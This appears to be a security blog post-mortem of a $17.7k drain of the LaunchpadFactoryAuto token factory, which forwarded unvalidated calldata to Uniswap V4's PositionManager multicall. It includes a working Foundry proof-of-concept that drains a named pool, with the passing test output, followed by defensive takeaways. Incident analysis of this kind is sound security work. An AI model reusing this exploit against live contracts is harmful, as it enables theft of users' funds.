---
title: "LaunchpadFactoryAuto drained for $17.7k via arbitrary multicall in Uniswap V4 PositionManager"
date: 2026-08-17T11:31:50+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["attack"]
description: "LaunchpadFactoryAuto forwarded unvalidated calldata to Uniswap V4 PositionManager multicall, allowing anyone to execute privileged actions as the factory and drain all pool positions."
---

On Ethereum block 25692310, `LaunchpadFactoryAuto` was exploited for $17,743.91 USDC and 0.0072 WETH (~$17,766 total). The root cause was simple: the permissionless `launch()` function passed arbitrary caller-supplied calldata straight to `PositionManager.multicall()`. Because the factory owns every liquidity position NFT it deploys, executing calldata under the factory's identity allowed an attacker to grant themselves full operator approvals and burn the liquidity out of every pool.

Transaction: `0x9583e95d5c88c7966e269197f4b09022f26b7a27ad2c13660dda6774e3136d14`

<!--more-->

## The protocol

`LaunchpadFactoryAuto` is a token factory designed for one-transaction token launches paired on Uniswap V4. When a new token is launched, the factory clones a `LaunchTokenAuto` ERC20 contract, initializes a Uniswap V4 pool, seeds liquidity, and holds the minted Uniswap V4 position NFT on behalf of the launch.

| Contract | Address |
| --- | --- |
| `LaunchpadFactoryAuto` | `0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825` |
| `PositionManager` (Uniswap V4) | `0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e` |
| `UniversalRouter` | `0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af` |
| Permit2 | `0x000000000022D473030F116dDEE9F6B43aC78BA3` |

A total of 15 tokens had been launched through the factory, paired against various base assets including USDC, WETH, and Ondo tokenized stocks (such as NVDAon, AAPLon, TSLAon, and SPYon). The largest pool by far was `UNISTREET` (`0x3Bf4118F8862857872e6c13f87743Ab05a52Bc7D`), which held approximately $17.68k USDC in underlying liquidity.

## The vulnerability

The factory's `launch()` function was open to anyone and accepted initial setup calldata for the pool and position:

```solidity
function launch(
    Params calldata p,
    bytes calldata initCalldata,
    bytes calldata modifyCalldata,
    SeedBuys calldata sb
) external payable returns (address token) {
    token = Clones.cloneDeterministic(implementation, p.salt);
    LaunchTokenAuto(token).initialize(
        p.name, p.symbol, p.supply, address(this), p.pairedStock, p.description, p.image, p.website, p.twitter, p.holdersShare
    );

    LaunchTokenAuto(token).approve(PERMIT2, p.seedAmount);
    IPermit2(PERMIT2).approve(token, POSITION_MANAGER, uint160(p.seedAmount), type(uint48).max);

    positionIdOf[token] = IPositionManager(POSITION_MANAGER).nextTokenId();
    bytes[] memory calls = new bytes[](2);
    calls[0] = initCalldata;
    calls[1] = modifyCalldata;
    IPositionManager(POSITION_MANAGER).multicall(calls);
    ...
```

Notice what happens with `initCalldata` and `modifyCalldata`:

1. `launch()` packs them into a 2-element `bytes[]` array and calls `IPositionManager(POSITION_MANAGER).multicall(calls)`.
2. Inside Uniswap V4's `PositionManager`, `multicall` iterates through the provided array and executes each item via `Address.functionDelegateCall` (or direct `delegatecall`).
3. In `PositionManager`, `msg.sender` for the internal call context is the locker, which is `LaunchpadFactoryAuto`.
4. The factory is the `ownerOf` every position NFT ever minted through this factory (`positionIdOf[...]`).

Because `initCalldata` and `modifyCalldata` were completely unvalidated, a caller could supply *any* function call supported by `PositionManager`. Since `PositionManager` executed those calls with the factory as the authenticated caller, the caller could invoke any privileged management function on all factory-owned positions.

## Attack flow

There are two clean ways to turn this arbitrary execution into drained assets:

### 1. The on-chain attack: global operator approval

In the actual exploit transaction (`0x9583e95d5c88c7966e269197f4b09022f26b7a27ad2c13660dda6774e3136d14`), the attacker used `setApprovalForAll`:

1. The attacker deployed an exploit contract.
2. The exploit contract called `LaunchpadFactoryAuto.launch()` with:
   - `initCalldata`: standard `initializePool` call to register a throwaway pool.
   - `modifyCalldata`: `abi.encodeWithSelector(IERC721.setApprovalForAll.selector, exploitContract, true)`.
3. When `PositionManager.multicall()` executed `modifyCalldata`, it ran `setApprovalForAll(exploitContract, true)` with `msg.sender == LaunchpadFactoryAuto`.
4. Now `exploitContract` was an approved operator for *all* position NFTs owned by `LaunchpadFactoryAuto`.
5. With operator permissions secured, `exploitContract` simply iterated through existing victim positions and called `PositionManager.modifyLiquidities()` directly with `BURN_POSITION` (`0x03`) and `TAKE_PAIR` (`0x11`):
   - UNISTREET (tokenId `360162`): drained $17,685.82 USDC
   - PIGCON (tokenId `364347`): drained $58.09 USDC
   - UNISTR (tokenId `360385`): drained 0.0037 WETH
   - LESLIE (tokenId `363137`): drained 0.0035 WETH
   - Three out-of-range positions (POTATO, UNICORN, CATSTREET): returned 0 paired assets.
6. Net profit: **$17,743.91 USDC + 0.0072 WETH** (~$17,766).

### 2. The direct one-shot alternative: direct burn in calldata

An attacker didn't even need a separate step. As shown in the reproduction below, an attacker could directly pass `modifyLiquidities` with `BURN_POSITION` and `TAKE_PAIR` inside `modifyCalldata`, setting the recipient directly to their own address. Because `PositionManager` executes `modifyLiquidities` under the factory's context, `onlyIfApproved(factory, tokenId)` passes, liquidity delta is removed, and `take()` sends the paired tokens to the attacker.

## Why Ondo RWA pools were spared

Four of the 15 pools were paired with Ondo tokenized stocks (`NVDAon`, `AAPLon`, `TSLAon`, `SPYon`), representing roughly $750 in paired value. These were not drained.

Ondo's `GMToken` implementation includes compliance checks on every transfer (`_beforeTokenTransfer` calls `_checkIsCompliant` on `from`, `to`, and `msg.sender`). Because the attacker's contract was not on Ondo's KYC/compliance whitelist, any attempt to `take()` or transfer Ondo tokens would revert the transaction.

## PoC reproduction

Here is a minimal Foundry PoC demonstrating the direct single-tx drain against the UNISTREET pool on a mainnet fork at block 25692310:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IPositionManager {
    function modifyLiquidities(bytes calldata unlockData, uint256 deadline) external payable;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface ILaunchpadFactory {
    struct Params {
        string name;
        string symbol;
        uint256 supply;
        address pairedStock;
        uint256 seedAmount;
        bytes32 salt;
        string description;
        string image;
        string website;
        string twitter;
        bool holdersShare;
    }
    struct SeedBuys {
        address payAsset;
        uint256 totalPayIn;
        bytes preCommands;
        bytes[] preInputs;
        uint128[] amounts;
        address[] recipients;
    }
    function launch(
        Params calldata p,
        bytes calldata initCalldata,
        bytes calldata modifyCalldata,
        SeedBuys calldata sb
    ) external payable returns (address);
}

contract LaunchpadDrainTest is Test {
    address constant FACTORY = 0xFB60CD0B36aD4bD839b91767a6Ad9055AB6aD825;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant UNISTREET = 0x3Bf4118F8862857872e6c13f87743Ab05a52Bc7D;
    uint256 constant UNISTREET_TOKEN_ID = 360162;

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com", 25692310);
    }

    function testDrainUnistreetPrincipal() external {
        address attacker = address(0xBEEF);
        vm.deal(attacker, 1 ether);

        uint256 usdcBefore = IERC20(USDC).balanceOf(attacker);

        // modifyCalldata: BURN_POSITION (0x03) + TAKE_PAIR (0x11)
        bytes memory actions = hex"0311";
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(uint256(UNISTREET_TOKEN_ID), uint128(0), uint128(0), bytes(""));
        params[1] = abi.encode(USDC, UNISTREET, attacker);
        bytes memory drainUnlock = abi.encode(actions, params);
        bytes memory drainCalldata = abi.encodeCall(
            IPositionManager.modifyLiquidities,
            (drainUnlock, block.timestamp + 300)
        );

        // no-op initCalldata
        bytes memory noopUnlock = abi.encode(bytes(""), new bytes[](0));
        bytes memory initCalldata = abi.encodeCall(
            IPositionManager.modifyLiquidities,
            (noopUnlock, block.timestamp + 300)
        );

        ILaunchpadFactory.Params memory p = ILaunchpadFactory.Params({
            name: "x",
            symbol: "x",
            supply: 1,
            pairedStock: USDC,
            seedAmount: 0,
            salt: keccak256("drain-salt"),
            description: "",
            image: "",
            website: "",
            twitter: "",
            holdersShare: false
        });
        ILaunchpadFactory.SeedBuys memory sb = ILaunchpadFactory.SeedBuys({
            payAsset: USDC,
            totalPayIn: 0,
            preCommands: "",
            preInputs: new bytes[](0),
            amounts: new uint128[](0),
            recipients: new address[](0)
        });

        vm.prank(attacker);
        ILaunchpadFactory(FACTORY).launch(p, initCalldata, drainCalldata, sb);

        uint256 usdcAfter = IERC20(USDC).balanceOf(attacker);
        uint256 gained = usdcAfter - usdcBefore;

        console2.log("USDC drained (raw 6dp):", gained);
        console2.log("USDC drained (USD):", gained / 1e6);

        assertEq(gained, 17685818100, "Should drain full UNISTREET USDC balance");
    }
}
```

Running the test yields:

```text
[PASS] testDrainUnistreetPrincipal() (gas: 312845)
Logs:
  USDC drained (raw 6dp): 17685818100
  USDC drained (USD): 17685
```

## Key takeaways

When integrating with Uniswap V4's `PositionManager` or any contract that dispatches arbitrary subcalls via `delegatecall` / `multicall`:

1. **Never pass untrusted calldata to shared infrastructure from a contract that holds assets or permissions.** `multicall` evaluates in the caller's context. If the caller contract owns NFTs, tokens, or operator roles, untrusted calldata gives callers full custody of those rights.
2. **Encode actions strictly on-chain.** If the factory only needs to `initializePool` and `MINT_POSITION`, it should construct those calldata buffers internally from typed parameters rather than accepting raw `bytes calldata` from external users.
